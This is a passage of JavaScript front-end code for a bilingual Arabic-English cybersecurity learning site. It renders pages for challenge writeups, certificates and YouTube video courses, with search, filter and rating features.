        .difficulty-badge {
          padding: 5px 15px;
          border-radius: 20px;
          font-size: 0.85rem;
          font-weight: bold;
        }
        .difficulty-easy { background: #d4edda; color: #155724; }
        .difficulty-medium { background: #fff3cd; color: #856404; }
        .difficulty-hard { background: #f8d7da; color: #721c24; }
      </style>

      <!-- Hero Section -->
      <div class="writeups-hero text-center">
        <div class="container" style="position: relative; z-index: 1;">
          <h1 class="display-4 fw-bold mb-3">
            <i class="fa-solid fa-book-open me-3"></i>
            ${txt('حلول التحديات', 'Challenge Writeups')}
          </h1>
          <p class="lead mb-4" style="opacity: 0.95;">
            ${txt('تعلم من الحلول التفصيلية لجميع التحديات', 'Learn from detailed solutions for all challenges')}
          </p>
          <div class="d-flex justify-content-center gap-4 flex-wrap">
            <div class="text-center">
              <h3 class="fw-bold">${allWriteups.length}</h3>
              <small style="opacity: 0.8;">${txt('حل متاح', 'Available Writeups')}</small>
            </div>
            <div class="text-center">
              <h3 class="fw-bold">5</h3>
              <small style="opacity: 0.8;">${txt('فئات', 'Categories')}</small>
            </div>
          </div>
        </div>
      </div>

      <div class="container">
        <!-- Filters -->
        <div class="card shadow-sm mb-4">
          <div class="card-body">
            <div class="row align-items-center">
              <div class="col-md-4 mb-3 mb-md-0">
                <input 
                  type="text" 
                  class="form-control" 
                  id="writeup-search" 
                  placeholder="${txt('بحث في الحلول...', 'Search writeups...')}"
                  onkeyup="filterWriteups()"
                />
              </div>
              <div class="col-md-4 mb-3 mb-md-0">
                <select class="form-select" id="writeup-category" onchange="filterWriteups()">
                  <option value="all">${txt('جميع الفئات', 'All Categories')}</option>
                  <option value="web">Web</option>
                  <option value="crypto">Crypto</option>
                  <option value="forensics">Forensics</option>
                  <option value="osint">OSINT</option>
                  <option value="network">Network</option>
                </select>
              </div>
              <div class="col-md-4">
                <select class="form-select" id="writeup-difficulty" onchange="filterWriteups()">
                  <option value="all">${txt('جميع المستويات', 'All Difficulties')}</option>
                  <option value="easy">${txt('سهل', 'Easy')}</option>
                  <option value="medium">${txt('متوسط', 'Medium')}</option>
                  <option value="hard">${txt('صعب', 'Hard')}</option>
                </select>
              </div>
            </div>
          </div>
        </div>

        <!-- Writeups List -->
        <div id="writeups-list">
          ${allWriteups.map(writeup => `
            <div class="writeup-card" onclick="viewWriteup('${writeup.id}')" data-category="${writeup.category}" data-difficulty="${writeup.difficulty}">
              <div class="d-flex justify-content-between align-items-start">
                <div class="flex-grow-1">
                  <h4 class="mb-2">${writeup.title}</h4>
                  <div class="writeup-meta">
                    <span class="difficulty-badge difficulty-${writeup.difficulty}">
                      ${writeup.difficulty.toUpperCase()}
                    </span>
                    <span>
                      <i class="fa-solid fa-user me-1"></i>
                      ${writeup.author}
                    </span>
                    <span class="rating-stars">
                      ${'★'.repeat(Math.floor(writeup.rating))}${'☆'.repeat(5 - Math.floor(writeup.rating))}
                      ${writeup.rating.toFixed(1)}
                    </span>
                    <span>
                      <i class="fa-solid fa-eye me-1"></i>
                      ${writeup.views}
                    </span>
                    <span>
                      <i class="fa-solid fa-thumbs-up me-1"></i>
                      ${writeup.votes}
                    </span>
                  </div>
                  <div class="mt-2">
                    ${writeup.tags.map(tag => `<span class="writeup-tag">#${tag}</span>`).join('')}
                  </div>
                </div>
                <div>
                  <span class="badge bg-${writeup.type === 'official' ? 'success' : 'primary'}">
                    ${writeup.type === 'official' ? txt('رسمي', 'Official') : txt('مجتمع', 'Community')}
                  </span>
                </div>
              </div>
            </div>
          `).join('')}
        </div>
      </div>
    </div>

    <script>
      window.filterWriteups = function() {
        const search = document.getElementById('writeup-search')?.value.toLowerCase() || '';
        const category = document.getElementById('writeup-category')?.value || 'all';
        const difficulty = document.getElementById('writeup-difficulty')?.value || 'all';
        
        const cards = document.querySelectorAll('.writeup-card');
        cards.forEach(card => {
          const cardCategory = card.getAttribute('data-category');
          const cardDifficulty = card.getAttribute('data-difficulty');
          const cardText = card.textContent.toLowerCase();
          
          const matchesSearch = !search || cardText.includes(search);
          const matchesCategory = category === 'all' || cardCategory === category;
          const matchesDifficulty = difficulty === 'all' || cardDifficulty === difficulty;
          
          card.style.display = (matchesSearch && matchesCategory && matchesDifficulty) ? '' : 'none';
        });
      };

      window.viewWriteup = function(id) {
        loadPage('writeup-viewer', id);
      };
    </script>
  `;
}

function pageWriteupViewer(writeupId) {
  const allWriteups = typeof writeups !== 'undefined' ? writeups : [];
  const writeup = allWriteups.find(w => w.id === writeupId);

  if (!writeup) {
    return `
      <div class="container mt-4">
        <div class="alert alert-danger">
          ${txt('الحل غير موجود', 'Writeup not found')}
        </div>
        <button class="btn btn-primary" onclick="loadPage('writeups')">
          ${txt('العودة للحلول', 'Back to Writeups')}
        </button>
      </div>
    `;
  }

  // Simple Markdown-like rendering
  let renderedContent = writeup.content
    .replace(/### (.*)/g, '<h3>$1</h3>')
    .replace(/## (.*)/g, '<h2>$1</h2>')
    .replace(/# (.*)/g, '<h1>$1</h1>')
    .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
    .replace(/\*(.*?)\*/g, '<em>$1</em>')
    .replace(/`([^`]+)`/g, '<code>$1</code>')
    .replace(/```(\w+)?\n([\s\S]*?)```/g, '<pre><code class="language-$1">$2</code></pre>')
    .replace(/\n\n/g, '</p><p>')
    .replace(/\n/g, '<br>');

  return `
    <div class="container mt-4">
      <style>
        .writeup-viewer {
          background: white;
          border-radius: 15px;
          padding: 40px;
          box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .writeup-viewer h1 { color: #2c3e50; margin-top: 30px; margin-bottom: 20px; }
        .writeup-viewer h2 { color: #34495e; margin-top: 25px; margin-bottom: 15px; }
        .writeup-viewer h3 { color: #7f8c8d; margin-top: 20px; margin-bottom: 10px; }
        .writeup-viewer code {
          background: #f8f9fa;
          padding: 2px 6px;
          border-radius: 4px;
          color: #e83e8c;
        }
        .writeup-viewer pre {
          background: #2d2d2d;
          color: #f8f8f2;
          padding: 20px;
          border-radius: 8px;
          overflow-x: auto;
          margin: 20px 0;
        }
        .writeup-viewer pre code {
          background: none;
          color: inherit;
          padding: 0;
        }
        .rating-section {
          background: #f8f9fa;
          padding: 20px;
          border-radius: 10px;
          margin-top: 30px;
        }
      </style>

      <button class="btn btn-outline-secondary mb-4" onclick="loadPage('writeups')">
        <i class="fa-solid fa-arrow-left me-2"></i>
        ${txt('العودة للحلول', 'Back to Writeups')}
      </button>

      <div class="writeup-viewer">
        <div class="d-flex justify-content-between align-items-start mb-4">
          <div>
            <h1 class="display-5">${writeup.title}</h1>
            <div class="text-muted">
              <i class="fa-solid fa-user me-2"></i>${writeup.author}
              <span class="mx-2">•</span>
              <i class="fa-solid fa-calendar me-2"></i>${new Date(writeup.createdAt).toLocaleDateString()}
              <span class="mx-2">•</span>
              <i class="fa-solid fa-eye me-2"></i>${writeup.views} ${txt('مشاهدة', 'views')}
            </div>
          </div>
          <div class="text-end">
            <span class="badge bg-${writeup.type === 'official' ? 'success' : 'primary'} fs-6 mb-2">
              ${writeup.type === 'official' ? txt('رسمي', 'Official') : txt('مجتمع', 'Community')}
            </span>
            <br>
            <span class="difficulty-badge difficulty-${writeup.difficulty}">
              ${writeup.difficulty.toUpperCase()}
            </span>
          </div>
        </div>

        <div class="mb-4">
          ${writeup.tags.map(tag => `<span class="writeup-tag">#${tag}</span>`).join('')}
        </div>

        <hr>

        <div class="content">
          <p>${renderedContent}</p>
        </div>

        ${writeup.codeSnippets && writeup.codeSnippets.length > 0 ? `
          <hr>
          <h3>${txt('أمثلة الكود', 'Code Examples')}</h3>
          ${writeup.codeSnippets.map(snippet => `
            <div class="mb-4">
              <h5>${snippet.title || snippet.language}</h5>
              <pre><code class="language-${snippet.language}">${snippet.code}</code></pre>
            </div>
          `).join('')}
        ` : ''}

        <div class="rating-section">
          <h4>${txt('تقييم هذا الحل', 'Rate this Writeup')}</h4>
          <div class="d-flex align-items-center gap-3">
            <div class="rating-stars fs-3">
              ${'★'.repeat(Math.floor(writeup.rating))}${'☆'.repeat(5 - Math.floor(writeup.rating))}
              <span class="fs-5 text-muted ms-2">${writeup.rating.toFixed(1)}/5.0</span>
            </div>
            <span class="text-muted">(${writeup.votes} ${txt('تقييم', 'ratings')})</span>
          </div>
          <div class="mt-3">
            <button class="btn btn-success me-2" onclick="rateWriteup('${writeup.id}', 'up')">
              <i class="fa-solid fa-thumbs-up me-2"></i>
              ${txt('مفيد', 'Helpful')}
            </button>
            <button class="btn btn-outline-secondary" onclick="rateWriteup('${writeup.id}', 'down')">
              <i class="fa-solid fa-thumbs-down me-2"></i>
              ${txt('غير مفيد', 'Not Helpful')}
            </button>
          </div>
        </div>
      </div>
    </div>

    <script>
      window.rateWriteup = function(id, type) {
        alert(type === 'up' ? '${txt('شكراً لتقييمك!', 'Thanks for your rating!')}' : '${txt('شكراً لملاحظاتك', 'Thanks for your feedback')}');
      };
    </script>
  `;
}



/* ========== Certificates Page ========== */
function pageCertificatesOld() {
  const myCerts = certificates.myCertificates;
  const availableCerts = certificatesData.available;

  let html = `
    <div class="container mt-4">
      <div class="row mb-4">
        <div class="col-12">
          <div class="card bg-dark text-white border-primary shadow-lg">
            <div class="card-body p-5 text-center" style="background: linear-gradient(135deg, #1a1c23 0%, #12141a 100%);">
              <i class="fa-solid fa-certificate fa-4x mb-3 text-primary"></i>
              <h1 class="display-4 fw-bold">${txt('شهاداتي', 'My Certificates')}</h1>
              <p class="lead text-muted">${txt('استعرض إنجازاتك وشارك شهاداتك الموثقة', 'View your achievements and share your verified certificates')}</p>
            </div>
          </div>
        </div>
      </div>
    `;

  if (myCerts.length === 0) {
    html += `
      <div class="col-12 text-center py-5">
        <div class="text-muted mb-3"><i class="fa-regular fa-folder-open fa-3x"></i></div>
        <h4>${txt('لا توجد شهادات بعد', 'No Certificates Yet')}</h4>
        <p>${txt('أكمل المسارات التعليمية للحصول على شهادات.', 'Complete learning paths to earn certificates.')}</p>
        <button class="btn btn-primary" onclick="loadPage('learningpaths')">${txt('ابدأ التعلم', 'Start Learning')}</button>
      </div>
    `;
  } else {
    myCerts.forEach(cert => {
      html += `
      <div class="col-md-6 col-lg-4">
        <div class="card h-100 border-0 shadow-sm certificate-card">
          <div class="card-body text-center p-4">
            <div class="mb-3">
              <i class="fa-solid fa-${cert.icon} fa-3x" style="color: ${cert.color}"></i>
            </div>
            <h5 class="card-title fw-bold">${cert.title}</h5>
            <p class="text-muted small">${cert.name}</p>
            <div class="badge bg-light text-dark mb-3">${new Date(cert.issueDate).toLocaleDateString()}</div>
            <div class="d-grid gap-2">
              <button class="btn btn-outline-primary btn-sm" onclick="certificates.viewCertificate('${cert.certificateId}')">
                <i class="fa-solid fa-eye"></i> ${txt('عرض', 'View')}
              </button>
            </div>
          </div>
        </div>
      </div>
      `;
    });
  }

  html += `
      </div>

      <hr class="my-5">

      <h3 class="mb-4"><i class="fa-solid fa-list-check text-warning"></i> ${txt('الشهادات المتاحة', 'Available Certificates')}</h3>
      <div class="row g-3">
  `;

  availableCerts.forEach(cert => {
    const isEarned = myCerts.some(c => c.id === cert.id);
    html += `
      <div class="col-md-6">
        <div class="card h-100 ${isEarned ? 'border-success' : ''}">
          <div class="card-body d-flex align-items-center">
            <div class="flex-shrink-0 me-3">
              <div class="rounded-circle bg-light d-flex align-items-center justify-content-center" style="width: 60px; height: 60px;">
                <i class="fa-solid fa-${cert.icon} fa-2x" style="color: ${cert.color}"></i>
              </div>
            </div>
            <div class="flex-grow-1">
              <h5 class="mb-1">${cert.name} ${isEarned ? '<i class="fa-solid fa-check-circle text-success" title="Earned"></i>' : ''}</h5>
              <p class="mb-1 small text-muted">${cert.description}</p>
              <small class="text-primary"><i class="fa-solid fa-bullseye"></i> ${cert.criteria}</small>
            </div>
          </div>
        </div>
      </div>
    `;
  });

  html += `
      </div>
    </div>

    <!--Certificate View Modal-- >
    <div class="modal fade" id="certificateModal" tabindex="-1" aria-hidden="true">
      <div class="modal-dialog modal-xl modal-dialog-centered">
        <div class="modal-content">
          <div class="modal-header border-0">
            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
          </div>
          <div class="modal-body p-0 bg-light" id="certificateModalBody">
            <!-- Certificate HTML injected here -->
          </div>
          <div class="modal-footer border-0 justify-content-center pb-4">
            <button type="button" class="btn btn-primary" id="btnDownloadPDF">
              <i class="fa-solid fa-download"></i> Download PDF
            </button>
            <button type="button" class="btn btn-info text-white" id="btnShareLinkedIn">
              <i class="fa-brands fa-linkedin"></i> Share on LinkedIn
            </button>
          </div>
        </div>
      </div>
    </div>
  `;

  return html;
}

function pageRoomViewer(roomId) {
  if (typeof roomViewer !== 'undefined') {
    return roomViewer.loadRoom(roomId);
  } else {
    return '<div class="alert alert-danger">Room Viewer module not loaded.</div>';
  }
}

// Export functions for use in app.js
if (typeof module !== 'undefined') {
  module.exports = {
    pageHome,
    pagePenTest,
    pageDashboard,
    pageOverview,
    pageRecon,
    pageScan,
    pageVulns,
    pageExploit,
    pagePost,
    pageReport,
    pageLabs,
    pageTools,
    pagePayloads,
    pageBugBounty,
    pageNotes,
    pageBookmarks,
    pageSettings,
    pagePlayground,
    pageEjpt,
    pageLocalLabs,
    pageCTF,
    pageAnalytics,
    pageWriteups,
    pageWriteupViewer,
    pageLearningPaths,
    pageCertificates,
    pageRoomViewer,
    pageCourses,
    pageCourseViewer,
    pageModuleViewer
  };
}

// ==================== COURSES PAGES ====================

// Page: All Courses
function pageCourses() {
  var activeCategory = 'all';
  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };

  function getCategoryColor(catId) {
    var cat = ytData.categories.find(function (c) { return c.id === catId; });
    return cat ? cat.color : '#667eea';
  }

  function getCategoryName(catId) {
    var cat = ytData.categories.find(function (c) { return c.id === catId; });
    if (!cat) return catId;
    return currentLang === 'ar' ? cat.nameAr : cat.name;
  }

  function getCategoryIcon(catId) {
    var cat = ytData.categories.find(function (c) { return c.id === catId; });
    return cat ? cat.icon : 'fa-folder';
  }

  // Calculate total stats
  var totalVideos = ytData.playlists.reduce(function (sum, p) { return sum + (p.totalVideos || 0); }, 0);
  var totalHours = Math.round(totalVideos * 10 / 60); // ~10 min per video

  var categoriesHtml = '<button class="category-btn active" onclick="filterYouTubeCourses(\'all\')" data-cat="all">' +
    '<i class="fa-solid fa-layer-group me-2"></i>' + txt('الكل', 'All') +
    '<span class="cat-count">' + ytData.playlists.length + '</span></button>';

  ytData.categories.forEach(function (cat) {
    var count = ytData.playlists.filter(function (p) { return p.category === cat.id; }).length;
    categoriesHtml += '<button class="category-btn" onclick="filterYouTubeCourses(\'' + cat.id + '\')" data-cat="' + cat.id + '" style="--cat-color: ' + cat.color + '">' +
      '<i class="fa-solid ' + cat.icon + ' me-2"></i>' + (currentLang === 'ar' ? cat.nameAr : cat.name) +
      '<span class="cat-count">' + count + '</span></button>';
  });

  var playlistsHtml = '';
  ytData.playlists.forEach(function (playlist, index) {
    var thumbUrl = 'https://img.youtube.com/vi/' + playlist.thumbnail + '/hqdefault.jpg';
    var catColor = getCategoryColor(playlist.category);
    var catIcon = getCategoryIcon(playlist.category);
    var levelClass = playlist.level === 'beginner' ? 'beginner' : playlist.level === 'intermediate' ? 'intermediate' : 'advanced';
    var levelText = playlist.level === 'beginner' ? txt('مبتدئ', 'Beginner') : playlist.level === 'intermediate' ? txt('متوسط', 'Intermediate') : txt('متقدم', 'Advanced');
    var estimatedHours = Math.round((playlist.totalVideos || 0) * 10 / 60);
    var title = currentLang === 'ar' ? (playlist.titleAr || playlist.title) : playlist.title;
    var desc = currentLang === 'ar' ? (playlist.description || '') : (playlist.descriptionEn || playlist.description || '');

    playlistsHtml += '<div class="col-md-6 col-lg-4 col-xl-3 playlist-card-wrapper" data-category="' + playlist.category + '" data-title="' + title.toLowerCase() + '" style="animation-delay: ' + (index * 0.05) + 's">' +
      '<div class="yt-playlist-card" style="--accent-color: ' + catColor + '">' +
      '<div class="yt-thumbnail" style="background-image: url(\'' + thumbUrl + '\')" onclick="openYouTubePlaylist(\'' + playlist.id + '\')">' +
      '<div class="yt-overlay"><i class="fa-solid fa-play fa-2x"></i><span class="play-text">' + txt('شاهد الآن', 'Watch Now') + '</span></div>' +
      '<span class="yt-video-count"><i class="fa-solid fa-list me-1"></i>' + playlist.totalVideos + '</span>' +
      '<span class="yt-duration"><i class="fa-solid fa-clock me-1"></i>' + estimatedHours + txt('س', 'h') + '</span>' +
      '</div>' +
      '<div class="yt-body">' +
      '<div class="d-flex justify-content-between align-items-center mb-2">' +
      '<span class="yt-level ' + levelClass + '">' + levelText + '</span>' +
      '<span class="yt-category"><i class="fa-solid ' + catIcon + ' me-1"></i>' + getCategoryName(playlist.category) + '</span>' +
      '</div>' +
      '<h5 class="yt-title">' + title + '</h5>' +
      '<p class="yt-desc">' + (desc.length > 100 ? desc.substring(0, 100) + '...' : desc) + '</p>' +
      '<div class="yt-channel"><i class="fa-brands fa-youtube me-2"></i>' + (playlist.channel || 'YouTube') + '</div>' +
      '<div class="yt-footer">' +
      '<button class="btn-watch" onclick="openYouTubePlaylist(\'' + playlist.id + '\')">' +
      '<i class="fa-solid fa-play"></i>' + txt('ابدأ التعلم', 'Start Learning') +
      '</button>' +
      '<a href="https://www.youtube.com/playlist?list=' + playlist.playlistId + '" target="_blank" class="btn-youtube" title="' + txt('شاهد على يوتيوب', 'Watch on YouTube') + '">' +
      '<i class="fa-brands fa-youtube"></i>' +
      '</a>' +
      '</div>' +
      '</div>' +
      '</div>' +
      '</div>';
  });

  return '<div class="container-fluid p-0 courses-page">' +
    '<style>' +
    // Hero Section with animated gradient
    '.courses-page { background: var(--bg-primary, #f5f7fa); min-height: 100vh; }' +
    '.yt-hero { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); color: white; padding: 60px 0 80px; margin-bottom: -40px; text-align: center; position: relative; overflow: hidden; }' +
    '.yt-hero::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: url("data:image/svg+xml,%3Csvg width=\'60\' height=\'60\' viewBox=\'0 0 60 60\' xmlns=\'http://www.w3.org/2000/svg\'%3E%3Cpath d=\'M54.627 0l.83.828-1.415 1.415L51.8 0h2.827zM5.373 0l-.83.828L5.96 2.243 8.2 0H5.374zM48.97 0l3.657 3.657-1.414 1.414L46.143 0h2.828zM11.03 0L7.372 3.657 8.787 5.07 13.857 0H11.03zm32.284 0L49.8 6.485 48.384 7.9l-7.9-7.9h2.83zM16.686 0L10.2 6.485 11.616 7.9l7.9-7.9h-2.83zM22.343 0L13.857 8.485 15.272 9.9l9.9-9.9h-2.83zM32 0l-3.486 3.485-1.414-1.414L30.172 0H32z\' fill=\'rgba(255,255,255,0.02)\' fill-rule=\'evenodd\'/%3E%3C/svg%3E"); }' +
    '.yt-hero h1 { font-size: 2.8rem; margin-bottom: 15px; font-weight: 800; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }' +
    '.yt-hero p { opacity: 0.85; max-width: 600px; margin: 0 auto 30px; font-size: 1.1rem; }' +

    // Stats Grid
    '.stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; max-width: 800px; margin: 0 auto; }' +
    '.stat-card { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); padding: 25px; border-radius: 16px; text-align: center; border: 1px solid rgba(255,255,255,0.1); transition: all 0.3s ease; }' +
    '.stat-card:hover { transform: translateY(-5px); background: rgba(255,255,255,0.15); }' +
    '.stat-card h3 { font-size: 2.2rem; margin-bottom: 5px; background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; }' +
    '.stat-card small { opacity: 0.8; font-size: 0.9rem; }' +
    '@media (max-width: 768px) { .stats-grid { grid-template-columns: repeat(2, 1fr); } .yt-hero h1 { font-size: 2rem; } }' +

    // Search Box
    '.search-container { max-width: 500px; margin: 0 auto 20px; position: relative; }' +
    '.search-box { width: 100%; padding: 15px 50px 15px 20px; border: 2px solid var(--border-color, #e1e5eb); border-radius: 50px; font-size: 1rem; background: var(--bg-card, white); color: var(--text-primary, #333); transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }' +
    '.search-box:focus { outline: none; border-color: #667eea; box-shadow: 0 4px 20px rgba(102,126,234,0.2); }' +
    '.search-icon { position: absolute; right: 20px; top: 50%; transform: translateY(-50%); color: #999; }' +

    // Category Filters
    '.category-filters { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; padding: 25px; background: var(--bg-card, white); border-radius: 20px; margin-bottom: 30px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }' +
    '.category-btn { padding: 10px 20px; border: 2px solid transparent; border-radius: 30px; background: var(--bg-secondary, #f0f2f5); cursor: pointer; transition: all 0.3s ease; font-weight: 600; display: flex; align-items: center; gap: 8px; color: var(--text-primary, #333); position: relative; }' +
    '.category-btn:hover { transform: translateY(-2px); box-shadow: 0 4px 15px rgba(0,0,0,0.1); background: var(--bg-hover, #e8eaed); }' +
    '.category-btn.active { background: linear-gradient(135deg, #667eea, #764ba2); color: white; border-color: transparent; box-shadow: 0 4px 15px rgba(102,126,234,0.4); }' +
    '.cat-count { background: rgba(0,0,0,0.1); padding: 2px 8px; border-radius: 12px; font-size: 0.75rem; margin-left: 5px; }' +
    '.category-btn.active .cat-count { background: rgba(255,255,255,0.2); }' +

    // Playlist Cards with animations
    '.playlist-card-wrapper { animation: fadeInUp 0.5s ease forwards; opacity: 0; }' +
    '@keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }' +
    '.yt-playlist-card { background: var(--bg-card, white); border-radius: 20px; overflow: hidden; box-shadow: 0 8px 30px rgba(0,0,0,0.08); transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); height: 100%; display: flex; flex-direction: column; border: 1px solid var(--border-color, #e1e5eb); }' +
    '.yt-playlist-card:hover { transform: translateY(-10px) scale(1.02); box-shadow: 0 20px 50px rgba(0,0,0,0.15); border-color: var(--accent-color); }' +
    '.yt-thumbnail { height: 180px; background-size: cover; background-position: center; position: relative; cursor: pointer; overflow: hidden; }' +
    '.yt-thumbnail::before { content: ""; position: absolute; inset: 0; background: linear-gradient(to bottom, transparent 40%, rgba(0,0,0,0.8) 100%); z-index: 1; }' +
    '.yt-overlay { position: absolute; inset: 0; background: rgba(102,126,234,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; transition: all 0.4s ease; color: white; z-index: 2; gap: 10px; }' +
    '.yt-thumbnail:hover .yt-overlay { opacity: 1; }' +
    '.play-text { font-weight: 600; font-size: 0.9rem; }' +
    '.yt-video-count { position: absolute; bottom: 10px; left: 10px; background: rgba(0,0,0,0.85); color: white; padding: 6px 12px; border-radius: 8px; font-size: 0.8rem; font-weight: 600; z-index: 3; }' +
    '.yt-duration { position: absolute; bottom: 10px; right: 10px; background: rgba(102,126,234,0.9); color: white; padding: 6px 12px; border-radius: 8px; font-size: 0.8rem; font-weight: 600; z-index: 3; }' +
    '.yt-body { padding: 20px; flex-grow: 1; display: flex; flex-direction: column; }' +
    '.yt-level { padding: 5px 12px; border-radius: 20px; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; }' +
    '.yt-level.beginner { background: linear-gradient(135deg, #d4edda, #c3e6cb); color: #155724; }' +
    '.yt-level.intermediate { background: linear-gradient(135deg, #fff3cd, #ffeaa7); color: #856404; }' +
    '.yt-level.advanced { background: linear-gradient(135deg, #f8d7da, #f5c6cb); color: #721c24; }' +
    '.yt-category { font-size: 0.8rem; color: var(--accent-color); font-weight: 600; }' +
    '.yt-title { font-size: 1.1rem; font-weight: 700; margin: 12px 0; line-height: 1.5; color: var(--text-primary, #333); display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; min-height: 3.3em; }' +
    '.yt-desc { font-size: 0.85rem; color: var(--text-secondary, #6c757d); flex-grow: 1; line-height: 1.6; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }' +
    '.yt-channel { font-size: 0.8rem; color: var(--text-secondary, #6c757d); margin: 12px 0; padding: 8px 0; border-top: 1px solid var(--border-color, #e1e5eb); }' +
    '.yt-footer { display: flex; gap: 10px; margin-top: auto; }' +
    '.btn-watch { flex: 1; padding: 12px 20px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; border-radius: 12px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 8px; }' +
    '.btn-watch:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(102,126,234,0.4); }' +
    '.btn-youtube { padding: 12px 16px; background: #ff0000; color: white; border: none; border-radius: 12px; cursor: pointer; transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; text-decoration: none; }' +
    '.btn-youtube:hover { background: #cc0000; transform: translateY(-2px); }' +

    // No results message
    '.no-results { text-align: center; padding: 60px 20px; color: var(--text-secondary, #6c757d); }' +
    '.no-results i { font-size: 4rem; margin-bottom: 20px; opacity: 0.3; }' +
    '</style>' +

    '<div class="yt-hero">' +
    '<h1><i class="fa-brands fa-youtube me-3"></i>' + txt('كورسات الفيديو', 'Video Courses') + '</h1>' +
    '<p>' + txt('تعلم الأمن السيبراني من أفضل القنوات العربية - كل الكورسات مجانية 100%', 'Learn cybersecurity from the best Arabic channels - All courses are 100% free') + '</p>' +
    '<div class="stats-grid">' +
    '<div class="stat-card"><h3>' + ytData.playlists.length + '</h3><small>' + txt('كورس', 'Courses') + '</small></div>' +
    '<div class="stat-card"><h3>' + totalVideos + '</h3><small>' + txt('فيديو', 'Videos') + '</small></div>' +
    '<div class="stat-card"><h3>' + totalHours + '+</h3><small>' + txt('ساعة', 'Hours') + '</small></div>' +
    '<div class="stat-card"><h3>' + ytData.categories.length + '</h3><small>' + txt('تصنيف', 'Categories') + '</small></div>' +
    '</div>' +
    '</div>' +

    '<div class="container pb-5">' +
    '<div class="search-container">' +
    '<input type="text" class="search-box" placeholder="' + txt('ابحث عن كورس...', 'Search for a course...') + '" oninput="searchYouTubeCourses(this.value)">' +
    '<i class="fa-solid fa-search search-icon"></i>' +
    '</div>' +
    '<div class="category-filters">' + categoriesHtml + '</div>' +
    '<div class="row g-4" id="playlists-grid">' + playlistsHtml + '</div>' +
    '<div class="no-results" id="no-results" style="display: none;">' +
    '<i class="fa-solid fa-search"></i>' +
    '<h4>' + txt('لم يتم العثور على نتائج', 'No results found') + '</h4>' +
    '<p>' + txt('جرب البحث بكلمات مختلفة', 'Try searching with different keywords') + '</p>' +
    '</div>' +
    '</div>' +
    '</div>';
}

// Filter YouTube courses by category
window.filterYouTubeCourses = function (category) {
  var cards = document.querySelectorAll('.playlist-card-wrapper');
  var btns = document.querySelectorAll('.category-btn');
  var noResults = document.getElementById('no-results');
  var searchInput = document.querySelector('.search-box');
  var visibleCount = 0;

  // Clear search when filtering
  if (searchInput) searchInput.value = '';

  btns.forEach(function (btn) {
    btn.classList.remove('active');
    if (btn.getAttribute('data-cat') === category) {
      btn.classList.add('active');
    }
  });

  cards.forEach(function (card, index) {
    if (category === 'all' || card.getAttribute('data-category') === category) {
      card.style.display = 'block';
      card.style.animationDelay = (visibleCount * 0.05) + 's';
      visibleCount++;
    } else {
      card.style.display = 'none';
    }
  });

  // Show/hide no results message
  if (noResults) {
    noResults.style.display = visibleCount === 0 ? 'block' : 'none';
  }
};

// Search YouTube courses
window.searchYouTubeCourses = function (query) {
  var cards = document.querySelectorAll('.playlist-card-wrapper');
  var noResults = document.getElementById('no-results');
  var btns = document.querySelectorAll('.category-btn');
  var visibleCount = 0;

  query = query.toLowerCase().trim();

  // Reset category filter to 'all' when searching
  btns.forEach(function (btn) {
    btn.classList.remove('active');
    if (btn.getAttribute('data-cat') === 'all') {
      btn.classList.add('active');
    }
  });

  cards.forEach(function (card, index) {
    var title = card.getAttribute('data-title') || '';
    var category = card.getAttribute('data-category') || '';
    var cardText = card.textContent.toLowerCase();

    if (query === '' || title.includes(query) || cardText.includes(query)) {
      card.style.display = 'block';
      card.style.animationDelay = (visibleCount * 0.03) + 's';
      visibleCount++;
    } else {
      card.style.display = 'none';
    }
  });

  // Show/hide no results message
  if (noResults) {
    noResults.style.display = visibleCount === 0 ? 'block' : 'none';
  }
};

// Open YouTube playlist viewer
window.openYouTubePlaylist = function (playlistId) {
  loadPage('youtube-viewer', playlistId);
};

// Page: Course Viewer
function pageCourseViewer(courseId) {
  const course = courses.find(c => c.id === courseId);
  if (!course) return '<h2>الكورس غير موجود</h2>';

  const progress = getCourseProgress(courseId);
  const userStats = getUserStats();

  return `
    <div class="container-fluid mt-4">
      <style>
        .course-header {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          padding: 50px 30px;
          border-radius: 20px;
          margin-bottom: 30px;
        }
        .course-content {
              background: white;
          border-radius: 15px;
          padding: 30px;
          box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
        .module-card {
          background: white;
          border: 2px solid #e9ecef;
          border-radius: 15px;
          padding: 25px;
          margin-bottom: 20px;
          transition: all 0.3s ease;
        }
        .module-card:hover {
          border-color: #667eea;
          box-shadow: 0 4px 15px rgba(102, 126, 234, 0.1);
        }
        .module-header {
          display: flex;
          justify-content: between;
          align-items: center;
          margin-bottom: 20px;
        }
        .lesson-item {
          display: flex;
          align-items: center;
          padding: 15px;
          border-radius: 10px;
          margin-bottom: 10px;
          background: #f8f9fa;
          transition: all 0.2s ease;
        }
        .lesson-item:hover {
          background: #e9ecef;
        }
        .lesson-icon {
          width: 40px;
          height: 40px;
          border-radius: 50%;
          display: flex;
          align-items: center;
